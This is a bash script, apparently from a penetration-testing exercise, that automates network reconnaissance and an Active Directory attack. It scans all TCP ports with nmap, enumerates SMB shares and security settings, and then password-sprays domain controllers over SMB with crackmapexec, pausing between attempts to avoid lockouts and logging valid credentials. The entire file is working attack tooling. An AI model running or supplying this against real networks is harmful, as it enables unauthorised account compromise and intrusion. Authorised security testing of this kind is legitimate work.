#!/bin/bash

# Function to scan for all open TCP ports on a network
function INTERMEDIATE_SCAN {
    echo "Starting Intermediate Scanning..."
    echo "Scanning for all open TCP ports, please wait..."
    
	# Run a comprehensive Nmap scan and save the output
    nmap -p- -Pn -T4 "$target_network" -oN nmap_res.txt > /dev/null 2>&1

    # Filter the nmap output to exclude unwanted IPs (.2, .254, and the local_ip) - ***Consider to remove***
    # Append the filtered results to the log file
    # Using awk -v to pass external variable ($local_ip)
    echo -e "\n==== Nmap scan output for $target_network ====\n" >> "$log_file"
    awk -v local_ip="$local_ip" '
        # If the line matches "Nmap scan report for", extract the IP and check if it should be skipped
        /^Nmap scan report for/ {
            ip = $5
            # Skip IPs ending with .2 or .254, or the local_ip
            skip = (ip ~ /\.2$/ || ip ~ /\.254$/ || ip == local_ip)
        }
        # Print lines only if the skip flag is false (i.e., IP is not excluded)
        !skip { print }
    ' nmap_res.txt >> "$log_file"
    
    # Nmap footer in Log file
    echo -e "\n==== End of Nmap scan results for $target_network ====\n" >> "$log_file"
    
    # Output file to store the list of IPs with open ports
    output_file="nmap_hosts_with_ports.txt"
    > "$output_file"  # Clear previous contents

    # Loop through each IP and extract the open ports
    grep "Nmap scan report" nmap_res.txt | while read -r line; do
        # Extract the IP address from the line
        ip=$(echo "$line" | awk '{print $5}')
		
        # Skip certain IP addresses based on their pattern
        if [[ $ip =~ \.2$ || $ip =~ \.254$ || $ip == "$local_ip" ]]; then
            echo "Skipping IP: $ip (excluded IP pattern)"
            continue
        fi

        # Initialize a string to hold the open ports for this IP
        ports=""

        # Process nmap_res.txt to capture open ports for the specific IP
        capture=false  # Start with not capturing anything
        while read -r nmap_line; do
            if [[ "$nmap_line" =~ "Nmap scan report for $ip" ]]; then # If the variable 'nmap_line' contains the string "Nmap scan report for" followed by the value in 'ip'
                capture=true  # Start capturing once the scan for this IP starts
            elif [[ "$nmap_line" =~ "Nmap scan report for" && "$capture" == true ]]; then # If 'nmap_line' contains the string "Nmap scan report for" and 'capture' is set to true
                capture=false  # Stop capturing once the next scan report starts
            fi

            # If we're in the capturing phase and the line contains "open", extract the port number
            if [[ "$capture" == true && "$nmap_line" =~ "open" ]]; then
                port=$(echo "$nmap_line" | cut -d '/' -f 1)  # Extract the port number
                ports+="$port,"  # Add the port to the list
            fi
        done < nmap_res.txt  # Process nmap_res.txt line by line

        # Remove trailing comma from the port list
        ports=${ports%,}

        # If there are open ports, save them to the output file
        if [ -n "$ports" ]; then
            echo "$ip: $ports" >> "$output_file"
        fi
    done

    echo "Scanning complete."
}

# Function to Enumerates key services (e.g., FTP, SSH, SMB) for discovered IPs.
function INTERMEDIATE_ENUM {
    echo -e "\nEnumerating IPs for key services..."
    echo -e "\n==== Key service discovery ====\n" >> "$log_file"

    # Input file from previous scan with IPs and open ports
    input_file="nmap_hosts_with_ports.txt"

    # Define the key services and their respective ports
    declare -A key_services=(
        ["FTP"]=21
        ["SSH"]=22
        ["SMB"]=445
        ["WinRM_HTTP"]=5985
        ["WinRM_HTTPS"]=5986
        ["LDAP"]=389
        ["LDAPS"]=636
        ["RDP"]=3389
    )

    # Output file to store which IPs have which key services
    key_services_file="key_services_ips.txt"
    > "$key_services_file"  # Clear previous contents

    # Directory to store detailed results
    results_dir="results"
    mkdir -p "$results_dir"

    # Read each line from the IP:ports file
    while IFS= read -r line; do
        # Extract IP and list of open ports
        ip=$(echo "$line" | cut -d ':' -f1)
        ports=$(echo "$line" | cut -d ':' -f2 | tr -d ' ')  # Extract the ports from 'line' by splitting at the colon and removing any extra spaces

        # Check each service to see if its port is listed for this IP
        for service in "${!key_services[@]}"; do
            port=${key_services[$service]}

            # If the port for the service is found in the list of open ports
            if echo "$ports" | grep -qw "$port"; then
                echo -e "$service service found at $ip" | tee -a "$key_services_file" >> "$log_file"

                # Special handling for SMB service (port 445)
                if [[ "$service" == "SMB" ]]; then
                    # 1. Enumerate SMB shares on the target IP
                    echo -e "\n[*] Enumerating SMB shares on $ip..." | tee -a "$log_file"
                    nmap --script smb-enum-shares -p445 "$ip" -oN "$results_dir/smb_shares_${ip}.txt" > /dev/null 2>&1
                    cat "$results_dir/smb_shares_${ip}.txt" >> "$log_file"

                    # 2. Enumerate SMB OS and version on the target IP
                    echo -e "\n[*] Enumerating SMB OS and version on $ip..." | tee -a "$log_file"
                    nmap --script smb-os-discovery -p445 "$ip" -oN "$results_dir/smb_os_${ip}.txt" > /dev/null 2>&1
                    cat "$results_dir/smb_os_${ip}.txt" >> "$log_file"

                    # 3. Enumerate SMB security mode on the target IP
                    echo -e "\n[*] Enumerating SMB security mode on $ip..." | tee -a "$log_file"
                    nmap --script smb-security-mode -p445 "$ip" -oN "$results_dir/smb_security_${ip}.txt" > /dev/null 2>&1
                    cat "$results_dir/smb_security_${ip}.txt" >> "$log_file"

                    # 4. Enumerate supported SMB protocols on the target IP
                    echo -e "\n[*] Enumerating supported SMB protocols on $ip..." | tee -a "$log_file"
                    nmap --script smb-protocols -p445 "$ip" -oN "$results_dir/smb_protocols_${ip}.txt" > /dev/null 2>&1
                    cat "$results_dir/smb_protocols_${ip}.txt" >> "$log_file"
                fi
            fi
        done
    done < "$input_file"

    echo -e "\n==== End of key service discovery ====\n" >> "$log_file"
}

# Function to perform password-spraying attack on identified IPs with SMB (port 445)
function INTERMEDIATE_EXPLOIT {
    # Append header for password spraying results in the log file
    echo -e "\n==== Password spraying results ====\n" >> "$log_file"

    # This file contains a list of IPs with open ports 
    input_file="nmap_hosts_with_ports.txt"

    # This file contains the usernames to try for password spraying (file populated by Advanced Enumeration)
    userlist="$results_dir/domain_users.txt"

    # Read the list of usernames into an array called "users"
    mapfile -t users < "$userlist"

    # Ask the user for a password
    read -p "Enter the password to spray: " password
    echo -e "\nStarting password spraying with password: $password\n"

    # Read the list of hosts (IP:port) into an array called "hosts"
    mapfile -t hosts < "$input_file"

    # Loop through each host (IP:port)
    for line in "${hosts[@]}"; do
        # Extract the IP address (before the ":")
        ip=$(echo "$line" | cut -d ':' -f1)

        # Extract the list of open ports (after the ":") and remove spaces
        ports=$(echo "$line" | cut -d ':' -f2 | tr -d ' ')

        # Only continue if port 445 (SMB) is open and check if it's in the domain_controllers list
        if echo "$ports" | grep -qw "445"; then
            if [[ " ${domain_controllers[@]} " =~ " $ip " ]]; then
                # If it's a DC, start spraying users
                echo "Starting to test usernames on AD server $ip..."

                # Try each username from the user list
                for user in "${users[@]}"; do
                    # Skip any line that contains "====", "Starting to test", or "Trying"
                    if [[ "$user" == *"===="* || "$user" == *"Starting to test"* || "$user" == *"Trying"*  || "$user" == *"[+]"* ]]; then
                        continue  # Skip this line and move to the next one
                    fi

                    # Clean up the user string to remove invisible characters (e.g., carriage returns)
                    user=$(echo "$user" | tr -d '\r')

                    # Skip empty usernames
                    [[ -z "$user" ]] && continue

                    # Log the username being tested
                    echo "Trying $user@$ip ..."

                    # Use CrackMapExec to brute-force the username and password against SMB
                    output=$(crackmapexec smb "$ip" -u "$user" -p "$password" --no-bruteforce 2>/dev/null)

                    # Check each line of the output for successful logins
                    while IFS= read -r line; do
                        # Skip lines that contain "STATUS_LOGON_FAILURE"
                        if [[ "$line" == *"STATUS_LOGON_FAILURE"* ]]; then
                            continue
                        fi

                        # If the output contains "[+]", login was successful
                        if [[ "$line" == *"[+]"* ]]; then
                            echo -e "\n${GC}Weak credentials found!${NC}"
                            echo "$line"

                            # Save the successful login to the log file
                            echo -e "\nWeak credentials found:" >> "$log_file"
                            echo "$line" >> "$log_file"
                        fi
                    done <<< "$output"

                    # Wait for 2 seconds before trying the next username (To avoid lockouts)
                    sleep 2
                done
            else
                # Skip this host if it's not a domain controller
                echo "Skipping $ip — Not a domain controller or SMB port not open"
            fi
        else
            # Skip this host if port 445 (SMB) is not open
            echo "Skipping $ip — SMB port not open"
        fi
    done

    echo "Scanning complete."

    # Final message to indicate the end of password spraying
    echo -e "\n==== End of password spraying results ====\n" >> "$log_file"
    echo -e "\nPassword spraying completed.\n"
}



